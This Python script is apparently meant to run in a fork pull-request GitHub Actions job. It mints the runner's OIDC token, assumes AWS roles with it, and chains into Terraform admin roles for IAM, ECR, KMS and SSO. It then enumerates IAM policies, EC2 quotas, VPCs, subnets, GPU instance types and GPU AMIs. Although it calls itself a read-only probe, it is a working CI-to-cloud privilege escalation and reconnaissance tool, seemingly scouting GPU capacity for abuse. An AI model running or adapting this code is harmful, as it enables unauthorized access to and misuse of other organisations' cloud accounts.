#!/usr/bin/env python3
"""c211 intent 107629 - fork-PR GitHub-OIDC -> AWS AssumeRoleWithWebIdentity probe.

Read-only stage: mints the GitHub OIDC token, prints its safe claims, attempts
sts:AssumeRoleWithWebIdentity against each supplied role ARN, and on success
enumerates identity + role policy + service quotas + EC2/GPU offerings read-only.
Never prints JWTs, access keys or secret keys.
"""
import base64
import datetime
import hashlib
import hmac
import json
import os
import re
import urllib.error
import urllib.parse
import urllib.request


def out(tag, msg):
    print('C211[%s] %s' % (tag, msg), flush=True)


def http(url, data=None, headers=None, timeout=30):
    req = urllib.request.Request(url, data=data)
    for k, v in (headers or {}).items():
        req.add_header(k, v)
    try:
        with urllib.request.urlopen(req, timeout=timeout) as r:
            return r.status, r.read().decode('utf8', 'replace')
    except urllib.error.HTTPError as e:
        return e.code, e.read().decode('utf8', 'replace')
    except Exception as e:  # noqa: BLE001
        return 0, repr(e)[:300]


def jwt_claims(tok):
    try:
        p = tok.split('.')[1]
        p += '=' * (-len(p) % 4)
        return json.loads(base64.urlsafe_b64decode(p))
    except Exception as e:  # noqa: BLE001
        return {'_decode_error': repr(e)}


def mint():
    url = os.environ.get('ACTIONS_ID_TOKEN_REQUEST_URL')
    tok = os.environ.get('ACTIONS_ID_TOKEN_REQUEST_TOKEN')
    out('env', 'ACTIONS_ID_TOKEN_REQUEST_URL=%s ACTIONS_ID_TOKEN_REQUEST_TOKEN=%s'
        % ('present' if url else 'ABSENT', 'present' if tok else 'ABSENT'))
    out('env', 'GITHUB_REPOSITORY=%s GITHUB_EVENT_NAME=%s GITHUB_REF=%s'
        % (os.environ.get('GITHUB_REPOSITORY'), os.environ.get('GITHUB_EVENT_NAME'),
           os.environ.get('GITHUB_REF')))
    if not url or not tok:
        return None
    st, body = http(url + '&audience=sts.amazonaws.com', headers={'Authorization': 'bearer ' + tok})
    out('mint', 'status=%s bytes=%d' % (st, len(body)))
    if st != 200:
        out('mint', 'body=%s' % body[:400])
        return None
    try:
        t = json.loads(body).get('value')
    except Exception:  # noqa: BLE001
        out('mint', 'unparseable body=%s' % body[:300])
        return None
    if not t:
        return None
    c = jwt_claims(t)
    safe = {k: c.get(k) for k in ('iss', 'aud', 'sub', 'ref', 'event_name', 'repository',
                                  'repository_owner', 'actor', 'workflow')}
    out('mint', 'claims=%s' % json.dumps(safe, sort_keys=True))
    return t


def _sign(key, msg):
    return hmac.new(key, msg.encode('utf-8'), hashlib.sha256).digest()


def aws_call(creds, service, host, region, body, timeout=30):
    """Signed POST to an AWS query API. Returns (status, body)."""
    ct = 'application/x-www-form-urlencoded'
    t = datetime.datetime.utcnow()
    amzdate = t.strftime('%Y%m%dT%H%M%SZ')
    datestamp = t.strftime('%Y%m%d')
    payload_hash = hashlib.sha256(body.encode()).hexdigest()
    ch = ('content-type:%s\nhost:%s\nx-amz-date:%s\nx-amz-security-token:%s\n'
          % (ct, host, amzdate, creds['SessionToken']))
    sh = 'content-type;host;x-amz-date;x-amz-security-token'
    creq = '\n'.join(['POST', '/', '', ch, sh, payload_hash])
    scope = '%s/%s/%s/aws4_request' % (datestamp, region, service)
    sts = '\n'.join(['AWS4-HMAC-SHA256', amzdate, scope,
                     hashlib.sha256(creq.encode()).hexdigest()])
    k = _sign(('AWS4' + creds['SecretAccessKey']).encode(), datestamp)
    k = _sign(k, region)
    k = _sign(k, service)
    k = _sign(k, 'aws4_request')
    sig = hmac.new(k, sts.encode(), hashlib.sha256).hexdigest()
    auth = ('AWS4-HMAC-SHA256 Credential=%s/%s, SignedHeaders=%s, Signature=%s'
            % (creds['AccessKeyId'], scope, sh, sig))
    hdrs = {'Content-Type': ct, 'X-Amz-Date': amzdate,
            'X-Amz-Security-Token': creds['SessionToken'], 'Authorization': auth}
    return http('https://%s/' % host, data=body.encode(), headers=hdrs, timeout=timeout)


def tag(body, name):
    m = re.search(r'<%s>(.*?)</%s>' % (name, name), body, re.S)
    return m.group(1) if m else None


def creds_from_xml(body):
    if '<Credentials>' not in body:
        return None
    get = lambda n: tag(body, n)  # noqa: E731
    ak, sk, st = get('AccessKeyId'), get('SecretAccessKey'), get('SessionToken')
    if not (ak and sk and st):
        return None
    return {'AccessKeyId': ak, 'SecretAccessKey': sk, 'SessionToken': st,
            'Expiration': get('Expiration')}


def assume_web_identity(tok, role):
    body = urllib.parse.urlencode({
        'Action': 'AssumeRoleWithWebIdentity', 'Version': '2011-06-15',
        'RoleArn': role, 'RoleSessionName': 'c211-i107629',
        'WebIdentityToken': tok, 'DurationSeconds': '1800'})
    st, resp = http('https://sts.amazonaws.com/', data=body.encode(),
                    headers={'Content-Type': 'application/x-www-form-urlencoded'})
    c = creds_from_xml(resp)
    out('assume-web', '%s http=%s creds=%s %s' % (
        role, st, 'YES' if c else 'no',
        '' if c else 'err=%s' % (tag(resp, 'Code') or resp[:300])))
    if c:
        c['Expiration'] = tag(resp, 'Expiration')
    return c


def call(creds, service, host, region, params, label):
    body = urllib.parse.urlencode(params)
    st, resp = aws_call(creds, service, host, region, body)
    out(label, 'http=%s %s' % (st, resp[:1200].replace('\n', ' ')))
    return st, resp


def main():
    roles = [r.strip() for r in os.environ.get('C211_ROLES', '').split(',') if r.strip()]
    region = os.environ.get('C211_REGION', 'ap-southeast-1')
    out('start', 'roles=%d region=%s' % (len(roles), region))
    tok = mint()
    if not tok:
        out('verdict', 'NO_OIDC_TOKEN_MINTED')
        return
    working = []
    for role in roles:
        c = assume_web_identity(tok, role)
        st, resp = call(c, 'sts', 'sts.amazonaws.com', 'us-east-1',
                        {'Action': 'GetCallerIdentity', 'Version': '2011-06-15'},
                        'identity') if c else (0, '')
        if c:
            m = re.search(r'<Arn>(.*?)</Arn>', resp, re.S)
            out('identity', 'arn=%s' % (m.group(1) if m else 'unparsed'))
            working.append((role, c))
    if not working:
        out('verdict', 'ZERO_STS_ASSUME')
        return
    for role, c in working:
        acct = role.split(':')[4]
        # assume the terraform admin roles that this role is a principal of (per declaring repo)
        admin = {}
        for name in ('terraform-iam-admin', 'terraform-ecr-admin', 'terraform-kms-admin', 'terraform-sso-admin'):
            arn = 'arn:aws:iam::%s:role/%s' % (acct, name)
            body = urllib.parse.urlencode({'Action': 'AssumeRole', 'Version': '2011-06-15',
                                           'RoleArn': arn, 'RoleSessionName': 'c211-i107629-' + name,
                                           'DurationSeconds': '1800'})
            st, resp = aws_call(c, 'sts', 'sts.amazonaws.com', 'us-east-1', body)
            cc = creds_from_xml(resp)
            out('assume-role', '%s http=%s creds=%s %s' % (arn, st, 'YES' if cc else 'no',
                                                           '' if cc else 'err=%s' % (tag(resp, 'Code') or resp[:200])))
            if cc:
                cc['Expiration'] = tag(resp, 'Expiration')
                admin[name] = cc
        # read-only enumeration on whatever admin session exists
        for name, cc in admin.items():
            call(cc, 'iam', 'iam.amazonaws.com', 'us-east-1',
                 {'Action': 'ListAttachedRolePolicies', 'Version': '2010-05-08', 'RoleName': name},
                 'iam-attached-' + name)
            call(cc, 'iam', 'iam.amazonaws.com', 'us-east-1',
                 {'Action': 'ListRolePolicies', 'Version': '2010-05-08', 'RoleName': name},
                 'iam-inline-' + name)
        if 'terraform-iam-admin' in admin:
            cc = admin['terraform-iam-admin']
            for r in ('ap-southeast-1', 'us-east-1', 'us-west-2'):
                st, resp = aws_call(cc, 'servicequotas', 'servicequotas.%s.amazonaws.com' % r, r,
                                    urllib.parse.urlencode({'Action': 'ListServiceQuotas',
                                                            'Version': '2019-06-24',
                                                            'ServiceCode': 'ec2', 'MaxResults': '1000'}))
                found = {}
                for code in ('L-DB2E81BA', 'L-3819A6DF', 'L-417A185B', 'L-1216C47A', 'L-34B43A08'):
                    m = re.search(r'<QuotaCode>%s</QuotaCode>.*?<Value>(.*?)</Value>' % re.escape(code), resp, re.S)
                    if m:
                        found[code] = m.group(1)
                out('quotas', '%s http=%s %s' % (r, st, json.dumps(found)))
            call(cc, 'ec2', 'ec2.%s.amazonaws.com' % region, region,
                 {'Action': 'DescribeVpcs', 'Version': '2016-11-15'}, 'vpcs')
            call(cc, 'ec2', 'ec2.%s.amazonaws.com' % region, region,
                 {'Action': 'DescribeSubnets', 'Version': '2016-11-15'}, 'subnets')
            st, resp = aws_call(cc, 'ec2', 'ec2.%s.amazonaws.com' % region, region,
                                urllib.parse.urlencode({'Action': 'DescribeInstanceTypeOfferings',
                                                        'Version': '2016-11-15',
                                                        'LocationType': 'region',
                                                        'MaxResults': '1000'}))
            types = set(re.findall(r'<InstanceType>([a-z0-9\.\-]+)</InstanceType>', resp))
            gpu = sorted(t for t in types if re.match(r'^(g4dn|g5|g6|g6e|p2|p3|p3dn|p4d|p4de|p5|p6|trn1|inf)', t))
            out('offerings', 'http=%s total_types=%d gpu_types=%d %s'
                % (st, len(types), len(gpu), ','.join(gpu[:120])))
            call(cc, 'ec2', 'ec2.%s.amazonaws.com' % region, region,
                 {'Action': 'DescribeImages', 'Version': '2016-11-15', 'Owner.1': 'amazon',
                  'Filter.1.Name': 'name', 'Filter.1.Value.1': 'amzn2-ami-ecs-gpu-hvm-2.0.*-x86_64-gp2',
                  'Filter.2.Name': 'state', 'Filter.2.Value.1': 'available'}, 'ecs-gpu-ami')
    out('verdict', 'DONE_STS_ASSUME=%d' % len(working))


if __name__ == '__main__':
    main()
